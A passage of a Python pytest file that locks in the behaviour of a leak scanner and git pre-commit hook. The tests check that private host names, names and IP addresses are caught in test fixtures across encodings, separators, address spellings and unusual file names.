    """LOCK-IN: non-ASCII letters inside, at the start or at the end of a name, a dotted capital I
    elsewhere in the text, upper case, short names with a digit, and very long names are found."""
    assert LeakScanner({ident}).scan_text(text)


@pytest.mark.parametrize(
    ("ident", "text"),
    [("EE", "fee free ee"), ("CC", "cc: someone"), ("META", "meta tags")],
)
def test_lockin_short_codes_stay_exact_case(ident: str, text: str) -> None:
    """LOCK-IN: short all-capital codes match only in their own case. That is the intended guard
    against false positives on ordinary words (FXL-03, FXL-05); FXF-01 asks only that short
    names written in lower or mixed case (user names) fold."""
    assert LeakScanner({ident}).scan_text(text) == []


@pytest.mark.parametrize(
    "text",
    [
        "Campus\tUniversity",
        "Campus\nUniversity",
        "campus_university",
        "CampusUniversity",
        "campus.-.university",
    ],
)
def test_lockin_phrases_across_separators(text: str) -> None:
    """LOCK-IN: a multi-word identifier is found across tabs, newlines, '_', '.', '-' and with no
    separator at all."""
    assert LeakScanner({"Campus University"}).scan_text(text)


@pytest.mark.parametrize(
    ("ident", "text", "networks"),
    [
        ("2001:db8::5", "GET http://[2001:db8::5]:8080/x", ()),
        ("2001:db8::5", "nbr 2001:db8::5%eth0 up", ()),  # zone id in the text
        ("2001:db8::5", "nbr 2001:DB8:0:0:0:0:0:5 up", ()),
        ("2001:db8::5", "addr 2001:db8::5/64 dev eth0", ()),  # interface notation
        ("10.1.2.3", "mapped ::ffff:10.1.2.3 and ::ffff:a01:203", ()),
        ("10.1.2.3", "rule 10.1.2.3/0", ()),
        ("10.1.2.0/24", "zone 2.1.10.in-addr.arpa", ()),
        ("10.1.2.3", "ip-10-1-2-3abc.ec2.internal", ()),
        ("10.1.2.3", "010.001.002.003", ()),
        ("192.0.2.9", "dup 192.0.2.9", ()),
        ("x", "198.51.100.200 via 203.0.113.77", ("203.0.112.0/22",)),  # site prefix member
        ("x", "via 2001:db8:100::77", ("2001:db8:100::/48",)),  # IPv6 site prefix member
    ],
)
def test_lockin_address_forms_that_are_found(
    ident: str, text: str, networks: tuple[str, ...]
) -> None:
    """LOCK-IN: bracketed IPv6 with a port, zone ids, upper-case or expanded spellings, interface
    notation, mapped IPv4 in both spellings, /0, partial reverse zones, dashed forms glued to
    letters, zero padding, and IPv4 and IPv6 site-prefix membership."""
    assert LeakScanner({ident}, networks=networks).scan_text(text)


@pytest.mark.parametrize(
    "value",
    [
        HOST.replace("-", "%252525" + "2D"),  # four URL layers
        quote(HOST.replace("-", "\\x2d")) + " a+b %2541 &amp;amp;amp;lt; \\x5cx5cx41",
        json.dumps({"h": HOST.replace("-", "\\u002d")}),
        json.dumps([json.dumps({"h": HOST.replace("-", "\\u002d")})]),
        HOST.replace("-", "&#x2d;").replace("s", "&#115;", 1),
    ],
)
def test_lockin_decoded_views_that_work(value: str) -> None:
    """LOCK-IN: four URL layers, a two-step chain among heavy noise, JSON nested once (and twice
    when the outer level is a list) with ``\\u`` escapes, and HTML numeric entities are all
    decoded."""
    assert _scan_value(HOST, {"m": value})


def test_lockin_scan_file_intact_gz_and_bom_jsonl(tmp_path: Path) -> None:
    """LOCK-IN: an intact ``.gz`` (JSON Lines) and a UTF-8 file with a BOM are read."""
    gz = tmp_path / "c.jsonl.gz"
    gz.write_bytes(gzip.compress(f'{{"a": 1}}\n{{"h": "{HOST}"}}\n'.encode()))
    bom = tmp_path / "c.json"
    escaped = HOST.replace("-", "\\u002d")
    bom.write_text("\ufeff" + json.dumps({"h": "x"}).replace("x", escaped), encoding="utf-8")
    scanner = LeakScanner({HOST})
    assert scanner.scan_file(gz)
    assert scanner.scan_file(bom)


def test_lockin_digit_and_dot_runs_are_cheap(tmp_path: Path) -> None:
    """LOCK-IN: long runs of digits and dots (version strings, counters, timestamps) do not blow
    up the address extractors or the word index: a megabyte projects to about
    3 s here, under the 10 s budget that FXF-17 also uses."""
    rng = random.Random(1)
    scanner = LeakScanner(_corpus_sized_denylist())
    text = ".".join(str(rng.randrange(10**9)) for _ in range(30_000))[:200_000]
    path = tmp_path / "counters.json"
    path.write_text(json.dumps({"m": text}))
    start = time.perf_counter()
    scanner.scan_file(path)
    projected = (time.perf_counter() - start) * 1_000_000 / path.stat().st_size
    assert projected < 10.0, f"projected {projected:.1f} s"


def test_lockin_verify_relative_paths_scan_every_component_without_printing(
    env: Env, monkeypatch: pytest.MonkeyPatch
) -> None:
    """LOCK-IN: a relative path (as the hook passes it, with ``..`` too) has every component
    scanned. A directory named after an identifier fails, and neither it nor a content hit is
    printed."""
    env.sample({"host": {"name": HOST}})
    env.write(f"tests/fixtures/{HOST}/a.json", json.dumps({"m": f"via {HOST}"}))
    monkeypatch.chdir(env.root / "tests")
    with _quiet() as out:
        code = env.verify(f"../tests/fixtures/{HOST}/a.json")
    assert code == 1
    assert HOST not in out.getvalue()
    assert "LEAK fixture#" in out.getvalue()


def test_lockin_samples_leaves_no_staging_or_old_directories(env: Env) -> None:
    """LOCK-IN: ``samples`` replaces its output directory and leaves no ``.alerts.staging`` or
    ``.alerts.old`` behind, both on a clean run and when a leak stops it."""
    env.sample({"message": "clean"})
    parent = env.mod.OUT_DIR.parent
    with _quiet():
        assert env.samples() == 0
        assert env.samples() == 0  # the second run replaces the first one's directory
    assert sorted(p.name for p in parent.iterdir()) == ["alerts"]
    env.policy(denylist_extra=["Synthetic"])
    with _quiet():
        assert env.samples() == 1
    assert sorted(p.name for p in parent.iterdir()) == ["alerts"]


def test_lockin_build_keeps_extras_literals_and_reports_ambiguity(env: Env) -> None:
    """LOCK-IN: ``build`` keeps ``denylist_extra``, the literal keys and 3+ letter asset names,
    leaves 2-letter asset codes out, and counts a raw value equal to a pseudonym as ambiguous."""
    env.assets(
        [{"name": "Hostel-Q9", "range": "10.31.0.0/16"}, {"name": "EE", "range": "10.32.0.0/16"}]
    )
    env.policy(denylist_extra=["logsrv-x9"])
    env.sample({"host": {"name": HOST}})
    sanitizer, scanner, ambiguous = env.mod.build(env.raw())
    assert ambiguous == 0
    for text in ("logsrv-x9", "Campus University", "Hostel-Q9", "10.31.0.0/16"):
        assert scanner.scan_text(text), text
    assert scanner.scan_text("EE") == []
    pseudonym = sanitizer.map_text(HOST)
    env.sample({"host": {"name": pseudonym}})
    assert env.mod.build(env.raw())[2] >= 1


@pytest.mark.parametrize(
    "rel",
    ["tests/fixtures/with space.json", "tests/fixtures/new\nline.json"],
)
def test_lockin_hook_verifies_odd_file_names(
    hook_repo: tuple[Path, Callable[[], int], list[list[str]]], rel: str
) -> None:
    """LOCK-IN: staged fixture names with spaces or newlines reach ``verify`` intact (``-z``)."""
    repo, main, calls = hook_repo
    (repo / rel).parent.mkdir(parents=True, exist_ok=True)
    (repo / rel).write_text(json.dumps({"m": f"relayed by {HOST}"}))
    _git(repo, "add", "-A")
    assert _refused(main)
    assert calls == [[rel]]


def test_lockin_hook_verifies_renames_and_symlink_text(
    hook_repo: tuple[Path, Callable[[], int], list[list[str]]],
) -> None:
    """LOCK-IN: a leaking file renamed INTO tests/fixtures/ is verified under its new name, and a
    staged symlink is verified by its link text (what git stores)."""
    repo, main, _ = hook_repo
    (repo / "notes").mkdir()
    (repo / "notes" / "a.json").write_text(json.dumps({"m": f"relayed by {HOST}"}))
    _git(repo, "add", "-A")
    _commit(repo)
    (repo / "tests" / "fixtures").mkdir(parents=True)
    _git(repo, "mv", "notes/a.json", "tests/fixtures/a.json")
    assert _refused(main)
    _git(repo, "reset", "-q", "--hard")
    link = repo / "tests" / "fixtures" / "link.json"
    link.parent.mkdir(parents=True, exist_ok=True)
    link.symlink_to(f"../../{HOST}/gone.json")
    _git(repo, "add", "-A")
    assert _refused(main)


def test_lockin_hook_deleted_fixture_and_non_utf8_name(
    hook_repo: tuple[Path, Callable[[], int], list[list[str]]],
) -> None:
    """LOCK-IN: deleting a fixture passes (nothing to verify), and a staged path that is not UTF-8
    makes the hook fail closed instead of skipping the file."""
    repo, main, _ = hook_repo
    clean = repo / "tests" / "fixtures" / "a.json"
    clean.parent.mkdir(parents=True)
    clean.write_text('{"m": "clean"}')
    _git(repo, "add", "-A")
    _commit(repo)
    _git(repo, "rm", "-q", "tests/fixtures/a.json")
    with _quiet():
        assert main() == 0
    _commit(repo)
    odd = repo / "tests" / "fixtures" / os.fsdecode(b"caf\xe9.json")
    odd.parent.mkdir(parents=True, exist_ok=True)
    odd.write_text('{"m": "clean"}')
    _git(repo, "add", "-A")
    assert _refused(main)
